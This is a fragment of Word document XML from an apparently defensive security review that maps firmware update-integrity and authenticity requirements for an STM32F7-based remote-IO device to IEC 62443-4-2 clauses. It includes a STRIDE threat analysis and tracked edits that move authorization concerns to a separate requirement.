              </w:rPr>
              <w:t>EDR 3.10 – Update integrity/authenticity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55EE4" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> 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60473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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Decisive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5B5C0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The </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>intentional</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">-corruption vector for firmware is the update path: the device installs an </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>unsigned BLOB</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-2953/7915). EDR 3.10's </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>signature-verification</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> limb is the RQ-005 concern.</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">(EDR 3.10's authorization limb — who may update — is </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>RQ-011</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="1461F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AE188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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">EDR 3.12 / 3.13 – </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Manufacturer / operator trust anchors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AE31E" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:lastRenderedPageBreak/>
              <w:t>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7BF07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lastRenderedPageBreak/>
              <w:t>Enablers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8542B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Their absence is </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>why</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> EDR 3.14/3.10 </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">cannot be met — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no on</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>-device root of trust.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="2167E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D1514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lastRenderedPageBreak/>
              <w:t xml:space="preserve">CR 3.3 – Security </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>functionality</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>verification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E57B7" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> 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7CAD7" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve">Partial </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>credit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D7F42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STM32F7 self-test library + startup tests give </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>runtime</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> integrity of executing code/RAM.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="0EA51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4B560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del w:id="12" w:author="Unknown">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>Authorization (CR 1.1/1.2/2.1, switch-gate)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EDDF1" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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55DFD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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Removed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-011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37B11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>"Who may perform the update" is access control = RQ-011, not integrity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6DAE316D" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-005 → EHSR 1.1.9 §1 →</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">{CR 3.4 [data], EDR 3.14 [boot], EDR 3.10 [update </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>signature verification</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — decisive], EDR 3.12/3.13 [trust anchors], CR 3.3 [runtime self-test]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Update authorization / access gate → RQ-011.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId110" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId111" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4EAB0B7F" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61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982"/>
        <w:gridCol w:w="5949"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="1FC68F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E4EC5E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4C94D5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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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F6A28B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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="27134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750C2" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve">Asset B – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Runtime</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>integrity</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>config</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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1F81F" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F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88857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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="2EF17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7E5D4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>Asset D – Image integrity (firmware)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8C72A" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F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D653C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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>primary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="023412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90B5A" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve">Asset F – Domain </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>separation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586B0" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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CE5AE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Keep — the update BLOB and version reporting traverse the </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>non-safety COM</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; a compromised COM is the delivery path for a corrupted image (integrity concern).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="7269D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9DE2F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del w:id="13" w:author="Unknown">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>Asset G – Operating-mode/switch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D74D0" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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721D7" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Demoted → RQ-011.</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> The switch is the </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorization</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> gate; its security analysis is access control, not integrity. </w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Cross-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>reference</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>only</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60D652CA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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE — corrected to integrity/authenticity only:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1932E9AD" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — recompute-CRC over modified parameters (Part B); modified firmware image (Part D).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513B409A" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Spoofing-of-image-source (authenticity limb, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> An </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> update means the device cannot verify the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the firmware image — a rogue/MITM image is indistinguishable from the legitimate one. This is an </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authenticity/integrity</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> failure (does the image come from a trusted source and is it unmodified?), correctly in RQ-005. </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">MITRE ATT&amp;CK </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t>for</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve"> ICS </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">T0857 </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>System Firmware</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692A3AF8" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="14" w:author="Unknown">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Elevation of Privilege</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> "Installing firmware requires which privilege / passing which gate" is access control = </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(The </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>impact</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of a corrupted image — total safety compromise — is noted in the RQ-005 gap severity, but the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>threat category</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of privilege/authorization is out of scope here.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142532EF" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61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1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721FB172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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Part B mitigation</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> accurately described; </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Part D</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> corrected (integrity mechanisms only; the switch-gate moved to RQ-011):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969"/>
        <w:gridCol w:w="1616"/>
        <w:gridCol w:w="3528"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="2ED398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E74C36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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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639FBC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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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F3F39F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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Protects</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
